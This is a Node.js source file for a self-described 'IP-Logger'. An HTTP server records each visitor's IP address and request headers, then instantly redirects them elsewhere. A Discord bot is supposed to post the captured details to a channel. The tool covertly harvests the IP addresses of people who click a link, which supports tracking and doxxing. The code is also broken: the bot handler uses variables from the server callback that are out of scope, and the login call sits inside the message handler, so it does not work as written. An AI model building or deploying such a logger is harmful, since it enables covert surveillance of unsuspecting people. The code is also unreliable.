var http = require('http');
var discord = require('discord.js')
var client = new discord.Client();
const config = require("./httpconfig.json")
var server = http.createServer(function (req, res) {  
    if (req.url == '/') { 
    
var ip = (req.headers['x-forwarded-for'] || '').split(',').pop().trim() || 
        req.connection.remoteAddress || 
        req.socket.remoteAddress || 
        req.connection.socket.remoteAddress
		var ipAddress = req.connection.remoteAddress;
		 if (ipAddress.substr(0, 7) == "::ffff:") {
    ipAddress = ipAddress.substr(7)
  }
  console.log('CMD Logs.')
  console.log('======================================')
  console.log('IP-Logger : ' + ipAddress)
  console.log('Method : ' + req.method)
  console.log('Route : ' + req.url)
  console.log('Headers : ' + req.headers['user-agent'])
  console.log('Host/IP : ' + req.headers['host'])
  console.log('Connection : ' + req.headers['connection'])
  console.log('Accept : ' + req.headers['accept'])
  console.log('HTTP Version : ' + req.httpVersion)
  console.log('======================================')
 ///Coded by !GalvinID#3839	   
	    
  res.write('<p>Hi There &#128526;</p>')			
		res.write(`<meta http-equiv = "refresh" content = "0.1; url = https://${config.ip} " /`)
		res.write('</body>') ;
		res.write('</html>') ;
		
        res.end();
    }
});
client.on("ready", () => {
server.listen(80); 
console.log('Simple IP-Logger by GalvinID')
console.log('Server UP in Port '+ server._connectionKey)
	
  console.log(`Bot is Online Now!`);
  client.user.setActivity(`Discord IP Logger by GalvinID and Fika`);
});

client.on("message", async message => {
  if(message.author.bot) return;
  if(!message.content.startsWith(config.prefix)) return;
  const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();
	//Main
var channel = client.channels.get(config.channel)
var embed = new discord.MessageEmbed()
.setTitle(`**New Connection!**`)
.addField(`**IP Address**`, ipAddress)
.addField(`**Method**`, req.method)
.addField(`**User-Agent**`,req.headers['user-agent'])
.addField(`**Connection**`,req.headers['connection'])
.addField(`**Accept**`,req.headers['accept'])
message.channel.send(embed)
	
//DISCORD MESSAGE Coded By Fika.
//This Feature Only.But, if All. Can Effected To API Discord.

	client.login(config.token);
});


